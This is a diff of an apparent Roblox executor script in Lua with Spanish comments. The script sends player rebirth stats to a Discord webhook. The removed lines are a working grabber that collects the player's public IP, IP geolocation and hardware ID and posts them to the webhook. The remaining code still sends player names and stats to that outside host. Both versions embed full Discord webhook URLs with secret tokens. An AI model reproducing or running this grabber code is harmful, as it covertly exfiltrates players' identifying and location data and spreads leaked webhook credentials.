@@ -3,24 +3,9 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local player = game.Players.LocalPlayer
 
-local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"
+local discordWebhookUrl = "https://discord.com/api/webhooks/1282137613330812989/vTfeh32ckz0NtllE6Cwiv77B1J9rKNoGoEgRSiSaZcXNLagK2FpI6yqKZpNtC_4OdQmH"
 local FILE_PATH = "rebirth_data.json"
 local playersData = {}
-
--- Obtener la IP y la geolocalización
-local function getPlayerInfo()
-    local ip, data = "N/A", "N/A"
-    local success, response = pcall(function()
-        ip = game:HttpGet("https://v4.ident.me/") -- Obtener IP pública
-        data = game:HttpGet("http://ip-api.com/json") -- Obtener información de geolocalización
-    end)
-    
-    if not success then
-        warn("Error al obtener IP o geolocalización:", response)
-    end
-
-    return ip, data
-end
 
 -- Formatear números grandes
 local function formatNumber(number)
@@ -33,30 +18,20 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[suffix_index])
 end
 
--- Enviar datos a Discord
+-- Enviar datos a Discord en formato tabla
 local function sendToDiscord(name, displayName, rebirthInfo)
     local formattedRebirth = formatNumber(rebirthInfo.PlayerRebirth)
-
-    -- Obtener IP y Geolocalización
-    local ip, data = getPlayerInfo()
-
-    -- Obtener HWID (ID del hardware)
-    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-
-    -- Preparar el contenido para enviar al webhook
-    local dataToSend = {
-        ["content"] = "```" .. 
-            "Nombre del jugador: " .. name .. "\n" ..
-            "Apodo del jugador: " .. displayName .. "\n" ..
-            "Rebirth (Formateado): " .. formattedRebirth .. "\n" ..
-            "Último Rebirth: " .. rebirthInfo.LastRebirthTime .. "\n" ..
-            "IP: " .. ip .. "\n" ..
-            "Datos de IP: " .. data .. "\n" ..
-            "HWID: " .. hwid .. "\n" ..
+    local data = {
+        ["content"] = "```" ..
+            "+----------------------+----------------------+----------------------+\n" ..
+            "| Nombre del Jugador    | Apodo del Jugador     | Rebirth (Formateado)  |\n" ..
+            "+----------------------+----------------------+----------------------+\n" ..
+            "| " .. name .. "          | " .. displayName .. "       | " .. formattedRebirth .. "         |\n" ..
+            "+----------------------+----------------------+----------------------+\n" ..
+            "Último Rebirth: " .. rebirthInfo.LastRebirthTime ..
             "```"
     }
 
-    -- Enviar los datos al webhook
     local success, response = pcall(function()
         return http_request({
             Url = discordWebhookUrl,
@@ -64,7 +39,7 @@ local function sendToDiscord(name, displayName, rebirthInfo)
             Headers = {
                 ["Content-Type"] = "application/json"
             },
-            Body = HttpService:JSONEncode(dataToSend)
+            Body = HttpService:JSONEncode(data)
         })
     end)
 
